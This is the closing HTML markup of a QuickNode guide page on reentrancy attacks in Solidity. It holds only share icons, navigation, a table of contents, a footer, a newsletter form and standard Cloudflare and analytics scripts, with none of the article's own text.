4.23115ZM5.13029 4.50364C6.07933 5.15183 7.21051 4.31831 8.03584 3.51853C8.64785 2.92546 9.48218 2.56042 10.4018 2.56042C10.8577 2.56042 11.2934 2.65041 11.6914 2.81353C12.1732 3.01094 12.7192 3.14137 13.167 2.87599C13.5242 2.66433 13.9751 2.69543 14.2999 2.95413C14.5539 3.15652 14.6895 3.46527 14.6759 3.77947C14.6718 3.87446 14.7039 3.9688 14.7651 4.04155C15.0516 4.382 15.0787 4.87081 14.8316 5.24084C14.7068 5.42767 14.5713 5.60727 14.4261 5.77859C14.0631 6.20661 13.8144 6.72671 13.7357 7.28234C13.2649 10.6073 10.5784 14.0657 5.9823 14.0657C4.42891 14.0657 2.98055 13.6097 1.76397 12.8291C1.37163 12.5774 1.20527 12.088 1.36292 11.6493C1.52057 11.2106 1.96041 10.939 2.42323 10.9946C2.5688 11.0121 2.71906 11.0208 2.87625 11.0208C3.12723 11.0208 3.23512 10.719 3.09331 10.5119C2.90986 10.2441 2.76377 9.9488 2.66246 9.63382C2.57381 9.3582 2.50747 9.06211 2.34644 8.82149C1.98522 8.28174 1.77445 7.63256 1.77445 6.93332V6.93326V6.9332V6.93314V6.93308V6.93302V6.93296V6.93289V6.93283V6.93277V6.93271V6.93265V6.93259V6.93253V6.93247V6.93241V6.93235V6.93229V6.93223V6.93217V6.9321V6.93204V6.93198V6.93192V6.93186V6.9318V6.93174V6.93168V6.93162V6.93156V6.9315V6.93144V6.93138V6.93132V6.93126V6.93119V6.93113V6.93107V6.93101V6.93095V6.93089V6.93083V6.93077V6.93071V6.93065V6.93059V6.93053V6.93047V6.93041V6.93035V6.93029V6.93023V6.93017V6.93011V6.93005V6.92999V6.92992V6.92986V6.9298V6.92974V6.92968V6.92962V6.92956V6.9295V6.92944V6.92938V6.92932V6.92926V6.9292V6.92914V6.92908V6.92902V6.92896V6.9289V6.92884V6.92878V6.92872V6.92866V6.9286V6.92854V6.92848V6.92842V6.92836V6.9283V6.92824V6.92818V6.92812V6.92806V6.928V6.92794V6.92788V6.92782V6.92776V6.9277V6.92764V6.92758V6.92752V6.92746V6.9274V6.92734V6.92728V6.92722V6.92716V6.9271V6.92704V6.92698V6.92692V6.92686V6.9268V6.92674V6.92668V6.92662V6.92656V6.9265V6.92644V6.92638V6.92632V6.92626V6.9262V6.92614V6.92608V6.92602V6.92596V6.9259V6.92584V6.92578V6.92572V6.92566V6.9256V6.92554V6.92548V6.92542V6.92536V6.9253V6.92524V6.92518V6.92512V6.92506V6.925V6.92494V6.92488V6.92482V6.92476V6.9247V6.92464V6.92458V6.92452V6.92446V6.9244V6.92434V6.92428V6.92422V6.92416V6.9241V6.92405V6.92399V6.92393V6.92387V6.92381V6.92375V6.92369V6.92363V6.92357V6.92351V6.92345V6.92339V6.92333V6.92327V6.92321V6.92315V6.92309V6.92303V6.92297V6.92291V6.92285V6.92279V6.92274V6.92268V6.92262V6.92256V6.9225V6.92244V6.92238V6.92232V6.92226V6.9222V6.92214V6.92208V6.92202V6.92196V6.9219V6.92184V6.92178V6.92173V6.92167V6.92161V6.92155V6.92149V6.92143V6.92137V6.92131V6.92125V6.92119V6.92113V6.92107V6.92101V6.92095V6.92089V6.92084V6.92078V6.92072V6.92066V6.9206V6.92054V6.92048V6.92042V6.92036V6.9203V6.92024V6.92018V6.92012V6.92006V6.92001V6.91995V6.91989V6.91983V6.91977V6.91971V6.91965V6.91959V6.91953V6.91947V6.91941V6.91936V6.9193V6.91924V6.91918V6.91912V6.91906V6.919V6.91894V6.91888V6.91882V6.91876V6.9187V6.91865V6.91859V6.91853V6.91847V6.91841V6.91835V6.91829V6.91823V6.91817V6.91811V6.91806V6.918V6.91794V6.91788V6.91782V6.91776V6.9177V6.91764V6.91758V6.91752V6.91747V6.91741V6.91735V6.91729V6.91723V6.91717V6.91711V6.91705V6.91699V6.91693V6.91688V6.91682V6.91676V6.9167V6.91664V6.91658V6.91652V6.91646V6.9164V6.91635V6.91629V6.91623V6.91617V6.91611V6.91605V6.91599V6.91593V6.91587V6.91582V6.91576V6.9157V6.91564V6.91558V6.91552V6.91546V6.9154V6.91535V6.91529V6.91523V6.91517V6.91511V6.91505V6.91499V6.91493V6.91488V6.91482V6.91476V6.9147V6.91464V6.91458V6.91452V6.91446V6.9144V6.91435V6.91429V6.91423V6.91417V6.91411V6.91405V6.91399V6.91393V6.91388V6.91382V6.91376V6.9137V6.91364V6.91358V6.91352V6.91347V6.91341V6.91335V6.91329V6.91323V6.91317V6.91311V6.91305V6.913V6.91294V6.91288V6.91282V6.91276V6.9127V6.91264V6.91259V6.91253V6.91247V6.91241V6.91235V6.91229V6.91223V6.91218V6.91212V6.91206V6.912V6.91194V6.91188V6.91182V6.91176V6.91171V6.91165V6.91159V6.91153V6.91147V6.91141V6.91135V6.9113V6.91124V6.91118V6.91112V6.91106V6.911V6.91094V6.91089V6.91083V6.91077V6.91071V6.91065V6.91059V6.91053V6.91048V6.91042V6.91036V6.9103V6.91024V6.91018V6.91012V6.91007V6.91001V6.90995V6.90989V6.90983V6.90977V6.90972V6.90966V6.9096V6.90954V6.90948V6.90942V6.90936V6.90931V6.90925V6.90919V6.90913V6.90907V6.90901V6.90895V6.9089V6.90884V6.90878V6.90872V6.90866V6.9086V6.90855V6.90849V6.90843V6.90837V6.90831V6.90825V6.90819V6.90814V6.90808V6.90802V6.90796V6.9079V6.90784V6.90779V6.90773V6.90767V6.90761V6.90755V6.90749V6.90743V6.90738V6.90732V6.90726V6.9072V6.90714V6.90708V6.90703V6.90697V6.90691V6.90685V6.90679V6.90673V6.90668V6.90662V6.90656V6.9065V6.90644V6.90638V6.90633V6.90627V6.90621V6.90615V6.90609V6.90603V6.90597V6.90592V6.90586V6.9058V6.90574V6.90568V6.90562V6.90557V6.90551V6.90545V6.90539V6.90533V6.90527V6.90522V6.90516V6.9051V6.90504V6.90498V6.90492V6.90487V6.90481V6.90475V6.90469V6.90463V6.90457V6.90451V6.90446V6.9044V6.90434V6.90428V6.90422V6.90416V6.90411V6.90405V6.90399V6.90393V6.90387V6.90381V6.90376V6.9037V6.90364V6.90358V6.90352V6.90346V6.90341V6.90335V6.90329V6.90323V6.90317V6.90311V6.90306V6.903C1.77445 6.50022 1.88162 6.07643 1.82633 5.67746C1.80498 5.52341 1.79394 5.36606 1.79394 5.20615C1.79394 4.58532 1.96085 4.00041 2.25402 3.49643C2.41903 3.21278 2.7127 3.02813 3.03984 3.00235C3.36698 2.97656 3.68595 3.11293 3.89336 3.36723C4.24882 3.80307 4.66554 4.18622 5.13029 4.50364Z" fill="#505963"></path></svg></a></li><li class="mr-2"><a class="relative border text-gray-700 hover:text-gray-900 dark:hover:text-gray-300 border-gray-200 transition duration-200 hover:border-gray-500 rounded-md p-2 h-10 w-10 flex items-center justify-center group cursor-pointer" href="https://www.facebook.com/sharer/sharer.php?u=https://www.quicknode.com/guides/ethereum-development/smart-contracts/a-broad-overview-of-reentrancy-attacks-in-solidity-contracts" target="_blank" rel="noreferrer"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="" data-name="facebook" type="system"><path d="M7.76609 1.0038C4.23383 1.11988 1.26159 3.99102 1.01728 7.53475C0.75898 11.2839 3.42672 14.4519 6.95408 14.9845V9.90005H5.82426C5.31605 9.90005 4.90444 9.48637 4.90444 8.9756C4.90444 8.46483 5.31605 8.05115 5.82426 8.05115H6.95338V6.82066C6.95338 4.78321 7.94109 3.88901 9.62602 3.88901C9.87592 3.88901 10.0894 3.89464 10.2707 3.90378C10.7159 3.92559 11.061 4.29847 11.061 4.74662C11.061 5.21307 10.6851 5.59087 10.221 5.59087H9.91162C9.19621 5.59087 8.94631 6.2726 8.94631 7.04086V8.05185H10.2553C10.669 8.05185 10.9854 8.42261 10.9224 8.83348L10.8468 9.32666C10.7957 9.65732 10.5129 9.90145 10.1797 9.90145H8.94631V15C12.3645 14.5336 15 11.597 15 8.03567C15 4.07193 11.7387 0.874346 7.76609 1.0038Z" fill="#505963"></path></svg></a></li><li class="mr-2"><a class="relative border text-gray-700 hover:text-gray-900 dark:hover:text-gray-300 border-gray-200 transition duration-200 hover:border-gray-500 rounded-md p-2 h-10 w-10 flex items-center justify-center group cursor-pointer" href="mailto:?subject=Check out this guide on QuickNode: A Broad Overview of Reentrancy Attacks in Solidity Contracts&amp;body=https://www.quicknode.com/guides/ethereum-development/smart-contracts/a-broad-overview-of-reentrancy-attacks-in-solidity-contracts" target="_blank" rel="noreferrer"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="" data-name="email" type="system"><g clip-path="url(#clip0_338_4455)"><path fill-rule="evenodd" clip-rule="evenodd" d="M12 2H4C2.94841 2 2.02319 2.54107 1.48754 3.36C1.1152 3.92925 1.35888 4.65175 1.83986 5.13273L6.23226 9.52513C7.20857 10.5014 8.79148 10.5014 9.76779 9.52513L14.1602 5.13276C14.6411 4.65179 14.8848 3.92929 14.5125 3.36004C13.9768 2.54109 13.0516 2 12 2ZM1 11V10.5355C1 8.7537 3.15429 7.86137 4.41422 9.1213L5.52515 10.2322C6.89198 11.5991 9.10806 11.5991 10.4749 10.2322L11.5858 9.12134C12.8457 7.86141 15 8.75375 15 10.5356V11C15 11.7444 14.1096 11.9025 13.5833 11.3761L13.0821 10.875C12.8869 10.6797 12.5703 10.6797 12.375 10.875C12.1798 11.0703 12.1798 11.3868 12.375 11.5821L12.9942 12.2013C13.5499 12.757 13.5184 13.7055 12.7578 13.9035C12.5157 13.9665 12.2618 14 12 14H4C3.61101 14 3.2393 13.926 2.89822 13.7912C2.35056 13.5749 2.33342 12.8737 2.7498 12.4573L3.12502 12.0821C3.32029 11.8868 3.32029 11.5703 3.12502 11.375C2.92976 11.1797 2.61318 11.1797 2.41792 11.375L2.16893 11.624C1.76629 12.0266 1.08584 11.9154 1.02017 11.3497C1.00685 11.235 1 11.1183 1 11ZM4 1C1.79086 1 0 2.79086 0 5V11C0 13.2091 1.79086 15 4 15H12C14.2091 15 16 13.2091 16 11V5C16 2.79086 14.2091 1 12 1H4Z" fill="currentColor"></path></g><defs><clipPath id="clip0_338_4455"><rect width="16" height="16" fill="white"></rect></clipPath></defs></svg></a></li><li><a class="relative border text-gray-700 hover:text-gray-900 dark:hover:text-gray-300 border-gray-200 transition duration-200 hover:border-gray-500 rounded-md p-2 h-10 w-10 flex items-center justify-center group cursor-pointer " rel="noreferrer"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="" data-name="link" type="system"><path fill-rule="evenodd" clip-rule="evenodd" d="M7.29289 3.05028L8.20391 3.96129C8.46647 4.22385 8.26199 4.71453 7.89828 4.78927C7.75734 4.81823 7.60861 4.7802 7.50687 4.67846L6.58579 3.75738C5.80474 2.97633 4.53841 2.97633 3.75736 3.75738C2.97631 4.53843 2.97631 5.80476 3.75736 6.58581L5.87868 8.70713C6.65973 9.48818 7.92606 9.48818 8.70711 8.70713C8.89215 8.52209 9.03335 8.30982 9.13071 8.08321C9.18113 7.96586 9.32394 7.90967 9.41426 7.99998L9.5006 8.08633C9.80028 8.386 9.89065 8.85362 9.62333 9.18249C9.55835 9.26243 9.48865 9.3398 9.41421 9.41424C8.24264 10.5858 6.34315 10.5858 5.17157 9.41424L3.05025 7.29292C1.87868 6.12134 1.87868 4.22185 3.05025 3.05028C4.22183 1.8787 6.12132 1.8787 7.29289 3.05028ZM8.70711 12.9498L7.79609 12.0388C7.53353 11.7762 7.73801 11.2855 8.10172 11.2108C8.24266 11.1818 8.39139 11.2198 8.49313 11.3216L9.41421 12.2427C10.1953 13.0237 11.4616 13.0237 12.2426 12.2427C13.0237 11.4616 13.0237 10.1953 12.2426 9.41424L10.1213 7.29292C9.34027 6.51187 8.07394 6.51187 7.29289 7.29292C7.10786 7.47795 6.96665 7.69023 6.86929 7.91684C6.81887 8.03419 6.67606 8.09038 6.58574 8.00006L6.4994 7.91372C6.19972 7.61404 6.10935 7.14642 6.37667 6.81755C6.44165 6.73762 6.51135 6.66024 6.58579 6.58581C7.75736 5.41424 9.65685 5.41424 10.8284 6.58581L12.9497 8.70713C14.1213 9.8787 14.1213 11.7782 12.9497 12.9498C11.7782 14.1213 9.87868 14.1213 8.70711 12.9498Z" fill="currentColor"></path></svg></a></li></ul></div></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><a class="pagination-nav__link pagination-nav__link--prev" href="/guides/ethereum-development/smart-contracts/how-to-call-another-smart-contract-from-your-solidity-code"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Call Another Smart Contract From Your Solidity Code</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/guides/ethereum-development/smart-contracts/an-introduction-to-upgradeable-smart-contracts"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Intro to Upgradeable Smart Contracts</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#overview" class="table-of-contents__link toc-highlight">Overview</a></li><li><a href="#what-is-a-reentrancy-attack" class="table-of-contents__link toc-highlight">What is a Reentrancy Attack?</a></li><li><a href="#explaining-how-reentrancy-attack-works-with-illustrations" class="table-of-contents__link toc-highlight">Explaining How Reentrancy Attack Works with Illustrations</a></li><li><a href="#explaining-reentrancy-with-custom-solidity-contracts" class="table-of-contents__link toc-highlight">Explaining Reentrancy with Custom Solidity Contracts</a></li><li><a href="#types-of-reentrancy-attacks" class="table-of-contents__link toc-highlight">Types of Reentrancy Attacks</a></li><li><a href="#examining-a-few-contracts-that-were-exploited-with-reentrancy-in-the-past" class="table-of-contents__link toc-highlight">Examining A Few Contracts That Were Exploited with Reentrancy in the Past</a></li><li><a href="#how-to-prevent-reentrancy-vulnerabilities-in-solidity" class="table-of-contents__link toc-highlight">How to Prevent Reentrancy Vulnerabilities in Solidity</a></li><li><a href="#conclusion" class="table-of-contents__link toc-highlight">Conclusion</a></li></ul></div></div></div></div><footer class="my-6 lg:my-10 border-t text-faint border-faint pt-12 mx-4 lg:ml-20 lg:mr-8"><div class="grid grid-cols-1 lg:grid-cols-2 text-base"><div class="px-4"><ul><li class="mb-2 flex gap-1 group"><span class="pt-1 group-hover:text-blue-500"><svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg" class="h-4 w-4"><path d="M5 17.5V25C5 27.7615 7.23857 30 10 30H17.5C24.4036 30 30 24.4036 30 17.5C30 10.5964 24.4036 5 17.5 5C10.5964 5 5 10.5964 5 17.5ZM32.5 17.5C32.5 9.21573 25.7842 2.5 17.5 2.5C9.21573 2.5 2.5 9.21573 2.5 17.5V30C2.5 31.3807 3.6193 32.5 5 32.5H17.5C25.7842 32.5 32.5 25.7842 32.5 17.5ZM35 17.4999C35 16.6029 36.143 16.1922 36.4705 17.0273C37.135 18.7228 37.5 20.5688 37.5 22.5V35C37.5 36.3807 36.3807 37.5 35 37.5H22.5001C20.6065 37.5 18.7949 37.149 17.1267 36.5088C16.2067 36.1558 16.5146 35 17.5 35C18.1311 35 18.7543 34.9665 19.3681 34.9015C19.9284 34.842 20.494 34.8527 21.0537 34.9172C21.5282 34.9717 22.0109 35 22.5001 35H30C32.7615 35 35 32.7615 35 30V22.5C35 22.0108 34.972 21.5281 34.9172 21.0536C34.8527 20.4939 34.842 19.9283 34.9015 19.368C34.9665 18.7542 35 18.131 35 17.4999Z" fill="currentColor"></path></svg></span><span>Chat with&nbsp;<a href="https://forum.quicknode.com/" target="_blank" rel="noopener noreferrer" class="resource-link text-blue-500 hover:no-underline h-full text-base py-1">our community</a></span></li><li class="mb-2 flex gap-1 group"><span class="pt-1 group-hover:text-blue-500"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-name="pencil" type="system"><path fill-rule="evenodd" clip-rule="evenodd" d="M3.12134 11.1213C3.04365 11.0436 3 10.9382 3 10.8284C3 10.5632 3.10536 10.3088 3.29289 10.1213L7.14645 6.26771C7.53697 5.87718 8.17014 5.87719 8.56066 6.26771L9.73224 7.43928C10.1228 7.82981 10.1228 8.46297 9.73224 8.8535L5.87868 12.7071C5.69114 12.8946 5.43679 12.9999 5.17157 12.9999C5.0617 12.9999 4.95633 12.9563 4.87864 12.8786L3.12134 11.1213ZM10.4393 6.73218C10.8299 7.1227 11.463 7.1227 11.8536 6.73218L11.8787 6.70705C12.2692 6.31653 12.2692 5.68336 11.8787 5.29284L10.7071 4.12127C10.3166 3.73074 9.68342 3.73074 9.29289 4.12126L9.26777 4.14639C8.87725 4.53691 8.87725 5.17008 9.26777 5.5606L10.4393 6.73218ZM2 10.8284V11.6568V12.9999C2 13.0203 2.00061 13.0404 2.0018 13.0604C2.00466 13.1084 2.01091 13.1555 2.02032 13.2015C2.11356 13.6572 2.51675 13.9999 3 13.9999H5.17157C5.70201 13.9999 6.21071 13.7892 6.58579 13.4142L12.5858 7.41416C13.3668 6.63311 13.3668 5.36678 12.5858 4.58573L11.4142 3.41416C10.6332 2.63311 9.36684 2.63311 8.58579 3.41416L2.58579 9.41416C2.21071 9.78923 2 10.2979 2 10.8284ZM7.8787 13.5355C7.71799 13.6962 7.82539 13.9999 8.05266 13.9999H13.5C13.7762 13.9999 14 13.7761 14 13.4999C14 13.2238 13.7762 12.9999 13.5 12.9999H8.82845C8.56323 12.9999 8.30888 13.1053 8.12134 13.2928L7.8787 13.5355Z" fill="currentColor"></path></svg></span><span>Check out our&nbsp;<a href="https://quicknode.com/docs/changelog/" target="_blank" rel="noopener noreferrer" class="resource-link text-blue-500 hover:no-underline h-full text-base py-1">product changelog</a></span></li><li class="mb-2 flex gap-1 group"><span class="pt-1 group-hover:text-blue-500"><svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg" class="h-4 w-4"><path d="M26.3915 12.2415C25.6122 11.8554 25.0632 11.0749 25.005 10.1611C25.0017 10.1078 25 10.0542 25 10.0001C25 8.6194 26.1193 7.50012 27.5 7.50012C27.8982 7.50012 28.2745 7.59317 28.6085 7.75872C29.3878 8.14485 29.9368 8.9253 29.995 9.83915C29.9983 9.89237 30 9.94605 30 10.0001C30 11.3808 28.8807 12.5001 27.5 12.5001C27.102 12.5001 26.7255 12.407 26.3915 12.2415ZM27.5 5.00012C28.1305 5.00012 28.7335 5.1168 29.2893 5.32972C30.2905 5.71352 31.4582 5.85892 32.3505 5.26412L33.2665 4.65342C33.841 4.2705 34.617 4.4257 35 5.00012C35.383 5.57452 35.2278 6.35062 34.6533 6.73355L33.6182 7.42362C32.7967 7.9713 32.5 9.01277 32.5 10.0001C32.5 12.7615 30.2615 15.0001 27.5 15.0001C26.9103 15.0001 26.3445 14.898 25.8192 14.7106C24.7452 14.3273 23.5022 14.1676 22.5534 14.8002L18.6182 17.4236C17.7967 17.9713 17.5 19.0128 17.5 20.0001C17.5 22.7615 15.2615 25 12.5 25C10.58 25 8.9128 23.9179 8.07503 22.3302C7.75625 21.7261 7.1801 21.2501 6.49702 21.2501H6.25003C5.55965 21.2501 5.00003 20.6905 5.00003 20.0001C5.00003 19.3097 5.55965 18.7501 6.25003 18.7501H6.49702C7.1801 18.7501 7.75625 18.2741 8.07503 17.67C8.9128 16.0823 10.58 15.0001 12.5 15.0001C13.0897 15.0001 13.6555 15.1022 14.1808 15.2896C15.2548 15.6729 16.4979 15.8326 17.4467 15.2L21.3818 12.5766C22.2033 12.0289 22.5 10.9874 22.5 10.0001C22.5 7.2387 24.7386 5.00012 27.5 5.00012ZM13.6086 17.7587C14.3878 18.1448 14.9369 18.9253 14.9949 19.8391C14.9983 19.8924 15 19.946 15 20.0001C15 21.3808 13.8807 22.5001 12.5 22.5001C11.5747 22.5001 10.7667 21.9974 10.3345 21.2501C10.1218 20.8824 10 20.4555 10 20.0001C10 19.5447 10.1218 19.1178 10.3345 18.7501C10.7667 18.0029 11.5747 17.5001 12.5 17.5001C12.8982 17.5001 13.2745 17.5932 13.6086 17.7587ZM5 28.75C5 29.4405 5.55965 30 6.25 30H33.75C34.4403 30 35 29.4405 35 28.75C35 28.0597 34.4403 27.5 33.75 27.5H6.25C5.55965 27.5 5 28.0597 5 28.75ZM8.75 33.75C8.75 34.4405 9.30965 35 10 35H15C15.6904 35 16.25 34.4405 16.25 33.75C16.25 33.0597 15.6904 32.5 15 32.5H10C9.30965 32.5 8.75 33.0597 8.75 33.75ZM31.25 33.75C31.25 34.4405 30.6903 35 30 35H25C24.3096 35 23.75 34.4405 23.75 33.75C23.75 33.0597 24.3096 32.5 25 32.5H30C30.6903 32.5 31.25 33.0597 31.25 33.75Z" fill="currentColor"></path></svg></span><span>Check on&nbsp;<a href="https://status.quicknode.com/" target="_blank" rel="noopener noreferrer" class="resource-link text-blue-500 hover:no-underline h-full text-base py-1">the status</a>&nbsp;of our services</span></li><li class="mb-2 flex gap-1 group"><span class="pt-1 group-hover:text-blue-500"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-name="paper" type="system"><path fill-rule="evenodd" clip-rule="evenodd" d="M12 2H4C3.44772 2 3 2.44772 3 3V13C3 13.5523 3.44772 14 4 14H7.17157C7.43679 14 7.69114 13.8946 7.87868 13.7071C7.95636 13.6294 8 13.5241 8 13.4142V10C8 9.44771 8.44771 9 9 9H12.4142C12.5241 9 12.6294 8.95636 12.7071 8.87868C12.8946 8.69114 13 8.43679 13 8.17157V3C13 2.44772 12.5523 2 12 2ZM7.17157 15C7.46015 15 7.7423 14.9376 8 14.8204L8.02614 14.8082C8.23202 14.7109 8.42169 14.5783 8.58579 14.4142L13.4142 9.58579C13.5852 9.41477 13.7221 9.21597 13.8204 9C13.9376 8.7423 14 8.46015 14 8.17157V3C14 1.89543 13.1046 1 12 1H4C2.89543 1 2 1.89543 2 3V13C2 14.1046 2.89543 15 4 15H7.17157ZM6 6.5C6 6.77614 6.22386 7 6.5 7H9.5C9.77614 7 10 6.77614 10 6.5C10 6.22386 9.77614 6 9.5 6H6.5C6.22386 6 6 6.22386 6 6.5Z" fill="currentColor"></path></svg></span><span>Read our blog for the&nbsp;<a href="https://blog.quicknode.com/" target="_blank" rel="noopener noreferrer" class="resource-link text-blue-500 hover:no-underline h-full text-base py-1">latest announcements</a></span></li></ul><div class="hidden lg:block mt-10"><a href="https://quicknode.com/" target="_blank" rel="noopener noreferrer" class="resource-link text-gray-300 hover:text-blue-500 hover:no-underline h-full text-base py-1 inline-block"><svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg" class="h-8 w-8"><g clip-path="url(#clip0_9_7)"><path d="M20 32.5C23.3956 32.5 26.4749 31.1461 28.7276 28.9486C28.7894 28.8884 28.8883 28.8883 28.9494 28.9494L34.1421 34.1421L39.5321 39.5321C39.6486 39.6486 39.5286 39.8429 39.3721 39.7907L30.7704 36.9235C30.7259 36.9086 30.677 36.9147 30.6372 36.9397C27.5563 38.8785 23.9091 40 20 40C8.9543 40 0 31.0458 0 20C0 8.9543 8.9543 0 20 0C31.0458 0 40 8.9543 40 20C40 24.7177 38.3665 29.054 35.6343 32.474C35.5764 32.5464 35.4686 32.5519 35.4031 32.4864L24.8431 21.9264C24.7265 21.8097 24.8466 21.6155 25.003 21.6676L31.7135 23.9045C31.7954 23.9318 31.884 23.8876 31.9103 23.8054C32.2933 22.6055 32.5 21.3269 32.5 20C32.5 13.0965 26.9035 7.5 20 7.5C13.0965 7.5 7.5 13.0965 7.5 20C7.5 26.9035 13.0965 32.5 20 32.5Z" fill="currentColor"></path></g><defs><clipPath id="clip0_9_7"><rect width="40" height="40" fill="white"></rect></clipPath></defs></svg></a></div></div><div class="px-4 mt-10 lg:mt-0"><div class="w-full xl:w-4/6"><div class="jetbrains px-0 xl:px-2 rounded-2xl"><h6 class="mb-2 block font-bold">Want the latest news in Web3?</h6><p class="mb-6 pr-0 md:pr-8 lg:pr-36 text-faint">We send out the #Web3Vibes newsletter with the coolest stuff in Blockchain every month. Sign up below!</p><div class="hubspot-form-wrapper"><form novalidate="" class="flex gap-4 items-start"><div class="flex-grow"><div><div style="transform:translateZ(0)" class="TextInput-module_input__2el9- flex outline-0 relative transition duration-150 cursor-text items-center text-md w-full rounded-md border drop-shadow-raised"><input aria-label="Email Address" name="email" placeholder="hi@example.com" id="react-aria-1" class="flex-1 py-2 transition transition-all duration-150 rounded-md leading-6 outline-none bg-transparent ring-none w-full px-4" value=""></div></div></div><div><button type="submit" aria-label="send" class="h-10 Button-module_button__peGiP button inline-flex justify-center text-center items-center transition duration-150 outline-0 Button-module_button--primary__dZXuW Button-module_button--md__B83Gc text-md"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-name="send" type="system"><path fill-rule="evenodd" clip-rule="evenodd" d="M3.06242 4.12664C2.85219 3.28574 3.73834 2.59385 4.50315 3.00175L12.2206 7.11771C12.9265 7.49418 12.9265 8.50595 12.2206 8.88242L4.50315 12.9984C3.73835 13.4063 2.85219 12.7144 3.06242 11.8735L3.43152 10.3971C3.5182 10.0504 3.78331 9.77628 4.12694 9.6781L8.31734 8.48085C8.80085 8.3427 8.80085 7.65747 8.31733 7.51932L4.12695 6.32207C3.78332 6.22389 3.51821 5.94979 3.43153 5.60308L3.06242 4.12664ZM2.19965 6.80044C2.44803 6.55206 2.54788 6.19157 2.46268 5.8508L1.54614 2.18462C1.33591 1.34372 2.22207 0.651836 2.98687 1.05973L14.3456 7.11771C15.0515 7.49418 15.0515 8.50595 14.3456 8.88242L2.98687 14.9404C2.22207 15.3483 1.33591 14.6564 1.54614 13.8155L2.46268 10.1494C2.54787 9.80859 2.44802 9.4481 2.19964 9.19972L1.70711 8.70719C1.31658 8.31667 1.31658 7.6835 1.70711 7.29298L2.19965 6.80044Z" fill="currentColor"></path></svg></button></div></form></div></div></div></div><div class="block px-4 lg:hidden mt-10"><a href="https://quicknode.com/" target="_blank" rel="noopener noreferrer" class="resource-link text-gray-300 hover:text-blue-500 hover:no-underline h-full text-base py-1 inline-block"><svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg" class="h-8 w-8"><g clip-path="url(#clip0_9_7)"><path d="M20 32.5C23.3956 32.5 26.4749 31.1461 28.7276 28.9486C28.7894 28.8884 28.8883 28.8883 28.9494 28.9494L34.1421 34.1421L39.5321 39.5321C39.6486 39.6486 39.5286 39.8429 39.3721 39.7907L30.7704 36.9235C30.7259 36.9086 30.677 36.9147 30.6372 36.9397C27.5563 38.8785 23.9091 40 20 40C8.9543 40 0 31.0458 0 20C0 8.9543 8.9543 0 20 0C31.0458 0 40 8.9543 40 20C40 24.7177 38.3665 29.054 35.6343 32.474C35.5764 32.5464 35.4686 32.5519 35.4031 32.4864L24.8431 21.9264C24.7265 21.8097 24.8466 21.6155 25.003 21.6676L31.7135 23.9045C31.7954 23.9318 31.884 23.8876 31.9103 23.8054C32.2933 22.6055 32.5 21.3269 32.5 20C32.5 13.0965 26.9035 7.5 20 7.5C13.0965 7.5 7.5 13.0965 7.5 20C7.5 26.9035 13.0965 32.5 20 32.5Z" fill="currentColor"></path></g><defs><clipPath id="clip0_9_7"><rect width="40" height="40" fill="white"></rect></clipPath></defs></svg></a></div></div></footer></div></main></div></div></div>
<script src="/guides/assets/js/runtime~main.d2360be6.js"></script>
<script src="/guides/assets/js/main.7eb23204.js"></script>
<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'89426f4e1acd4120',t:'MTcxODQ1MzE5NC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: medium; visibility: hidden;"></iframe><script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;rayId&quot;:&quot;89426f4e1acd4120&quot;,&quot;version&quot;:&quot;2024.4.1&quot;,&quot;token&quot;:&quot;d37c9e56cd5b45c58f71c1f401fed595&quot;}" crossorigin="anonymous"></script>

</body></html>